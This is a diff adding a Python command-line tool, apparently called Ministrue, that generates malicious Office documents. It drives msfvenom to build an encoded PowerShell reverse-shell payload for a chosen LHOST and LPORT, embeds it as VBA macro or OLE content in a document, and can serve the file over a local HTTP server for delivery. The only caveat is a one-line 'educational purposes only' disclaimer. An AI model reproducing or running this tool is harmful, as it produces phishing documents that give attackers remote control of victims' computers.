@@ -1,0 +1,119 @@
+#!/usr/bin/env python3
+
+import re, subprocess, os, sys
+from helpers.server import serve
+from helpers.prompts import *
+from helpers.doc_generator import doc_gen
+from helpers.psh_splitter import psh_concat
+from helpers.iface_prober import get_interfaces
+cwd = os.getcwd()
+sys.path.insert(0, "{}/packages".format(cwd))
+from prompt_toolkit import prompt
+
+version = '\033[3m{}\033[0m'.format('V1.0')
+banner = (f'''
+    __  ________   ________________  __  ________
+   /  |/  /  _/ | / /  _/_  __/ __ \/ / / / ____/
+  / /|_/ // //  |/ // /  / / / /_/ / / / / __/   
+ / /  / // // /|  // /  / / / _, _/ /_/ / /___   
+/_/  /_/___/_/ |_/___/ /_/ /_/ |_|\____/_____/{version}
+''')
+
+print(
+        banner,
+        '\t\033[3mManufacturing Truth since 1984\033[0m',
+        '\n\t   \033[3mMade with <3, by X0RW3LL\033[0m\n',
+        '\n[!] Hit Ctrl+C anytime to exit'
+        '\n[!] TAB completion and mouse selection are supported',
+        '\n[!] You can manually enter custom values',
+        '\n[!] Custom inputs must match their respective parameters',
+        '\n[!] Custom inputs for LHOST should either be an interface name, or an IP address',
+        '\n[!] LHOST autocompletion shows [IP addresses] for reference only',
+        '\n[!] Payload types (VBA vs OLE) must be selected from the menu',
+        '\n[!] Disclaimer: This program is for educational purposes only\n',
+    )
+
+payload_re = re.compile('(?<=")powershell.exe .+(?=")')
+encoder_re = re.compile('-e x86/shikata_ga_nai (-i [\d])?')
+
+def prompter(text, completer):
+    return prompt(
+                    text,
+                    completer=completer,
+                    complete_while_typing=True,
+                    complete_in_thread=True,
+                    mouse_support=True,
+                )
+
+def main():
+    global mode
+    global filename
+    global lhost
+    interfaces = w_com(get_interfaces())
+    payload = prompter('[*] Select a payload: ', payloads)
+    mode = prompter('[*] Select the payload type: ', modes)
+    lhost = prompter('[*] LHOST=', interfaces).split()
+    lport = prompter('[*] LPORT=', ports)
+    encoder = prompter('[*] Payload encoder: ', encoders)
+    filename = prompter('[?] Select or enter file name (without extensions): ', filenames)
+    platform = payload.split('/')[0]
+    arch_group = payload.split('/')[1]
+    
+    if 'x' not in arch_group:
+        arch = 'x86'
+    else:
+        arch = arch_group
+
+    cmd = 'msfvenom -p {} lhost={} lport={} -f hta-psh --platform {} -a {}'
+    cmd = cmd.format(payload, lhost[0], lport, platform, arch) \
+            if encoder == 'None' \
+            else 'msfvenom -p {} lhost={} lport={} -e {} -f hta-psh --platform {} -a {}'.\
+            format(payload, lhost[0], lport, encoder, platform, arch)
+    print('\n[+] Generating payload with: {}\n\n[!] This might take a moment...\n'.format(cmd))
+    return cmd, mode
+
+def payload_gen(data):
+    raw_payload = subprocess.check_output(data[0], shell=True)
+    extracted_payload = payload_re.search(raw_payload.decode('latin-1')).group().strip()
+    return extracted_payload
+
+if __name__ == '__main__':
+    try:
+        cmd = main()
+    except KeyboardInterrupt:
+        print('\n[-] Received SIGINT. Quitting')
+        exit()
+    try:
+        payload = payload_gen(cmd)
+    except subprocess.CalledProcessError as E:
+        print('\n[-] Encoder failed. Retrying without an encoder...\n')
+        payload = payload_gen([encoder_re.sub('', cmd[0]), 0])
+    final_payload = psh_concat(payload) if 'VBA' in mode else payload
+    ret_filename = doc_gen(final_payload, 1, filename) if 'VBA' in mode \
+            else doc_gen(final_payload, 2, filename)
+    try:
+        srv_port = prompter('[?] Start simple HTTP server hosting output directory? (Select an option or specify port number) ', srv_ports)
+        if srv_port != 'No':
+            PORT = int(srv_port.split()[-1]) if 'Yes' in srv_port else int(srv_port.strip())
+            try:
+                serve(PORT, '{}/output'.format(cwd), lhost[1][1:-1], ret_filename)
+            except KeyboardInterrupt:
+                print('\n[-] Received SIGINT. Quitting')
+                exit()
+            except OSError:
+                    print('\n[-] Port {} is currently in use. Retrying in 10s...'.\
+                            format(srv_port.split()[-1]))
+                    from time import sleep
+                    from prompt_toolkit.shortcuts import ProgressBar
+                    try:
+                        with ProgressBar() as pb:
+                            for i in pb(range(10), label='[!] Retrying: '):
+                                sleep(1)
+                        serve(PORT, '{}/output'.format(cwd), lhost[1][1:-1], ret_filename)
+                    except KeyboardInterrupt:
+                        print('\n[-] Received SIGINT. Quitting')
+                        exit()
+    except KeyboardInterrupt:
+        print('\n[-] Received SIGINT. Quitting')
+        exit()
+
